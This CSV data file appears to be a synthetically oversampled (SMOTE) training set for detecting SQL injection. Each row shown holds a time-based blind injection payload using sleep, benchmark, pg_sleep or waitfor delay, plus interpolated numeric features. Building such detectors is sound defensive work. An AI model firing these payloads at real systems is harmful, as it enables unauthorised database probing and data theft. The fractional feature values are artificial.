id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.19934671414744087,50.32644072198593,20.0,3.250915328746653,13.0,10.0,21.105367268321615,6.2210734536643235,0.2595370594226105,0.19964389186354656,0.41740855861761134,0.12341049009623158,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.221073453664323,0.0,0.0,1.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000012,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,0.18741957856914457,54.08278685824905,17.166582593576777,2.978327670465976,13.916708703211611,9.083291296788389,25.916204264672274,5.166582593576777,0.25855533026150046,0.16828740909249373,0.47784138209588456,0.09531587855012119,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.166582593576777,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.9167087032116117,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9167087032116115
SMOTE_000013,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000195,0.039702920062849485,46.0,20.162719003606743,3.58744233747166,21.0,2.0,16.0,7.0,0.45652173913043476,0.043478260869565216,0.34782608695652173,0.15217391304347827,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,1.9999999999999996,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,0.22485459255713167,73.16474684537751,15.151864209931361,2.452236443500678,10.92406789503432,10.0,43.392543160274556,8.848135790068639,0.14941415893037044,0.1369267549434202,0.5928355496919148,0.12082353643429465,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,7.848135790068638,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.924067895034319,0.07593210496568092,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,2.511509052364214,152.3414597612257,27.126156559957735,3.742583065197814,66.84608600105663,16.11690408029586,54.25231311991547,15.126156559957735,0.43681037920851185,0.10516011612080138,0.3581123571371202,0.09991714753356659,0.2523131199154691,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,10.0,0.0,1.7476868800845309,0.0,2.252313119915469,0.1261565599577345,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.1261565599577343,0.0,0.12615655995773456,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8738434400422654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8738434400422654,0.8738434400422654,6.873843440042265
SMOTE_000016,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.03925565033701845,65.98529941823367,20.0,2.9332788229063045,10.985299418233662,10.0,34.0,11.0,0.16647819766966232,0.15154941860551593,0.5152680232587542,0.1667043604660675,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.9852994182336616,0.014700581766338372,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,1.0329230862250562,88.09774424343443,26.688387609652096,3.65691659175362,30.655806195173952,10.0,35.753550438608386,11.688387609652096,0.3490254637100524,0.11377003223600196,0.4047341961512361,0.13247030790270958,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,4.6883876096520956,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.6558061951739522,0.34419380482604783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.09279084443575543,100.0,33.54215471764908,4.081705853088795,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000019,attack,time," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",nearest_attack_euclidean,R000232,0.812609998592865,55.889630956476864,19.0,3.3551807186088394,26.0,1.0,22.000607146208345,6.8890238102685215,0.469598227429349,0.01806147028574419,0.38963238685643325,0.12270791542847355,0.0,3.0,0.0,0.0,0.0,0.0,0.0,3.8890238102685206,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,1.2453024617768782,69.48846645770467,24.54487296612016,3.5499923764837042,22.398720525464352,10.0,28.853847559344192,8.235898372896127,0.31875255676641445,0.1464692621736495,0.41753662167057026,0.11724155938936572,0.0,1.9269237796720962,0.0,0.0,0.0,1.308974593224032,0.0,4.0,0.0,1.0,0.0,1.3089745932240322,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.3089745932240321,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.308974593224032
SMOTE_000021,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.09102475189787146,49.66069770033865,20.0,3.299962469550497,13.0,10.66069770033865,20.0,6.0,0.2618003795492235,0.21459886135232953,0.40276981469111306,0.12083094440733391,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,2.220446049250313e-16,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,1.433209135012002,71.08618946398964,18.60875465661618,2.8661616777674395,13.391245343383819,13.12996274707055,36.78249068676764,7.782490686767638,0.1892408380574351,0.1813800626518527,0.5202419571582348,0.10913714213247729,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.3912453433838188,0.0,6.0,0.0,0.0,0.3912453433838189,1.3912453433838188,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.3912453433838188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3912453433838188
SMOTE_000023,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,1.1970374501427463,85.1432573284632,28.20872964177489,3.9471237825367758,32.58254071645022,15.0,28.165081432900436,9.395635179112555,0.383086327974954,0.17713052957971126,0.3292506829866203,0.11053245945871445,0.0,3.0,0.0,0.0,0.0,0.6043648208874454,0.0,4.791270358225109,0.0,0.0,1.0,0.6043648208874455,0.0,1.0,0.0,0.0,0.0,0.6043648208874455,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,0.7919234438510897,68.81038724775367,18.78381636555741,2.834849706389746,13.21618363444259,11.729469075540717,36.43236726888518,7.432367268885179,0.1926990958290014,0.16801708601997517,0.5315232640635386,0.10776055408748489,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.2161836344425896,0.0,6.0,0.0,0.0,0.21618363444258945,1.2161836344425896,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.2161836344425896,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2161836344425896
SMOTE_000025,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,0.2336352228589097,68.58799067245516,25.20600466377242,3.6537993217805425,23.137336442514943,10.0,26.587990672455163,8.862663557485055,0.3376932203972998,0.14587533776752895,0.3873235813763784,0.1291078604587928,1.9313317787425275,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.9313317787425275,0.0,0.0,0.0,2.9313317787425275,1.0,0.0,0.0,0.06866822125747249,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,0.0,0.9313317787425275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9313317787425275
SMOTE_000026,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.629900251830466,37.95533524144691,16.0,3.004593766299947,11.0,0.0,17.477667620723455,9.477667620723455,0.29001476946921967,0.0,0.4604525314360155,0.24953269909476483,0.522332379276545,0.9553352414469103,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,0.0,1.0,0.5223323792765449,0.47766762072345514,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,1.3880136924252433,62.57172744951835,18.723769673397555,2.89572782069943,10.000000000000002,10.0,32.93361228621713,9.638115163301222,0.16212062305905012,0.1621206230590501,0.5204661466096191,0.15529260727228072,0.3618848366987768,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.91434548990367,0.3618848366987768,0.0,1.0,1.0,0.3618848366987768,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,time,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,nearest_attack_euclidean,R000237,1.1840801895946522,112.26900025496167,24.579551750513275,3.123958955295033,38.63258625085546,1.5265172501710929,56.003827753250754,16.106069000684368,0.34705259835987234,0.013238682131536103,0.4961542530139982,0.14355446649459339,3.526517250171092,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,10.579551750513275,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000029,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,1.5470237112363432,101.29938081937638,26.540123836124724,3.419456949086119,30.486625387958426,10.0,46.8395046555011,13.973250775916851,0.30224100740648063,0.09925885143531488,0.46053472809122314,0.13796541306698137,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.973250775916851,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,1.486625387958425,0.5133746120415749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000030,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000281,0.7334968992154981,91.1870221613076,26.75699753763249,3.796751870044011,26.0,21.75699753763249,31.944019698940092,11.486004924735024,0.28561538910869094,0.23919494305211236,0.349393153905806,0.12579651393339067,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.486004924735023,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.7569975376324882,0.2430024623675116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
